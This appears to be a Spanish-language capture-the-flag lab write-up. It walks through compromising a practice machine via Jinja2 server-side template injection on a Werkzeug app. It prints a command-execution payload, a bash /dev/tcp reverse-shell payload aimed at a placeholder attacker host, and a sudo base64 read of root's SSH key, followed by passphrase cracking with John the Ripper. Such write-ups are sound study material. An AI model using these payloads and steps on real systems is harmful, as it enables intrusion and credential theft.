## 1. Reconocimiento Inicial con Nmap

Iniciamos la auditoría realizando un escaneo exhaustivo para detectar puertos abiertos, servicios y sus respectivas versiones.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 9.2p1 Debian`
*   `80/tcp open http Apache httpd 2.4.59`: La página por defecto de Apache no revela información útil inicialmente.
*   `8089/tcp open http Werkzeug httpd 2.2.2 (Python 3.11.2)`: El puerto 8089 está abierto y ejecuta un servidor web `Werkzeug` con Python. Este es un punto de interés, ya que las aplicaciones web personalizadas a menudo contienen vulnerabilidades.

## 2. Enumeración Web y Descubrimiento de SSTI

Nos centramos en el puerto 8089, ya que es el servicio más prometedor para encontrar una vulnerabilidad.

### 2.1. Exploración del Puerto 8089

Al acceder a `http://<IP_DEL_OBJETIVO>:8089/`, encontramos una página web simple con un campo de entrada. Al introducir texto como "Hola", la página responde con "Hola Hola". 
Este comportamiento, donde la entrada del usuario se repite directamente en la salida, es un fuerte indicador de una posible vulnerabilidad de Server-Side Template Injection (SSTI).
![[Verdejo_P_8089.png]]
### 2.2. Confirmación de SSTI (Jinja2)

Para confirmar la vulnerabilidad SSTI y determinar el motor de plantillas, probamos una expresión matemática simple dentro de la sintaxis de plantillas de Jinja2, que es común en aplicaciones Python como las que usan Werkzeug.

Introducimos `{{7*7}}` en el campo de entrada. Si la página devuelve `49`, esto confirma la vulnerabilidad SSTI y que el motor de plantillas es Jinja2. Lo que significa que la aplicación web procesa la entrada del usuario a través de un motor de plantillas en el servidor sin una validación adecuada, permitiendo la inyección de código de plantilla malicioso.
![[Verdejo_49.png]]
## 3. Obtención de Reverse Shell (RCE)

Una vez confirmada la SSTI, podemos explotarla para ejecutar comandos en el sistema y obtener una shell inversa.

### 3.1. Ejecución de Comandos Arbitrarios

Utilizamos una carga útil (payload) de Jinja2 que nos permite ejecutar comandos del sistema operativo. Este payload utiliza la capacidad de Jinja2 para acceder a objetos globales de Python y ejecutar funciones del módulo `os`.

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read() }}
```

Al introducir este payload en el campo de entrada, la página debería devolver la salida del comando `id`, confirmando la ejecución de comandos.

### 3.2. Ejecución de Reverse Shell

Ahora que podemos ejecutar comandos, inyectamos un payload de reverse shell para obtener una conexión interactiva a nuestra máquina atacante.

**Payload de Reverse Shell (Jinja2):**

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'bash -c \\\'bash -i >& /dev/tcp/<IP_DE_TU_KALI>/443 0>&1\\\'\').read() }}
```

**En la Máquina Atacante:**

Antes de introducir el payload, configuramos un `netcat` listener en nuestra máquina atacante para recibir la conexión entrante en el puerto 443.

```bash
nc -lvnp 443
```

Después de configurar el listener, introducimos el payload en el campo de entrada de la página web. Esto ejecutará el código y nos dará una shell inversa en nuestra máquina atacante. Confirmamos que estamos como el usuario `www-data`.

## 4. Escalada de Privilegios

Una vez que tenemos una shell como `www-data`, el objetivo es escalar privilegios a `root`.

### 4.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario actual con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Salida:** `(root) NOPASSWD: /usr/bin/base64`

El usuario puede ejecutar el binario `base64` como `root` sin necesidad de contraseña. `base64` es una herramienta de codificación/decodificación que, al ejecutarse con altos privilegios, nos permite leer cualquier archivo del sistema.

### 4.2. Intento de Manipulación de /etc/passwd (Rabbit Hole)

En un primer intento, tratamos de extraer el archivo `/etc/passwd`, modificarlo eliminando la contraseña de `root` y volver a sobrescribirlo usando el parámetro `--decode`.

Sin embargo, la ejecución del comando: `sudo -u root /usr/bin/base64 --decode passwd.txt > /etc/passwd` falla debido a restricciones de permisos (Permiso denegado). 

> [!nota] Esto ocurre porque el operador de redirección `>` es interpretado por la shell de nuestro usuario actual (`www-data`), no por `sudo`.

### 4.3. Exfiltración de Clave SSH (id_rsa)

En lugar de escribir en archivos del sistema, utilizaremos el binario para **leer** archivos confidenciales inaccesibles para nuestro usuario.

Procedemos a extraer la clave privada SSH del usuario `root`:

```Bash
sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 --decode
```

Copiamos el contenido devuelto y lo guardamos en nuestra máquina local en un archivo llamado `id_rsa_root`. Le asignamos los permisos restrictivos requeridos por el protocolo SSH:

```Bash
chmod 600 id_rsa_root
```

Al intentar conectarnos (`ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>`), descubrimos que la clave está protegida por una contraseña (_passphrase_).

### 4.4. Cracking de la Passphrase SSH

Procedemos a romper la seguridad de la clave localmente utilizando la suite de **John the Ripper**.

1. Extraemos el hash de la clave:

```Bash
ssh2john id_rsa_root > key.hash
```

2. Ejecutamos un ataque de fuerza bruta mediante diccionario:

```Bash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

La herramienta logra descifrar la frase de contraseña: **`honda1`**.

## 5. Obtención de Root

Con la clave privada y su correspondiente _passphrase_, nos conectamos al servidor a través del puerto 22.

```Bash
ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>
# Enter passphrase for key 'id_rsa_root': honda1
```

Confirmamos el compromiso total de la máquina:

```Bash
whoami
# root
```
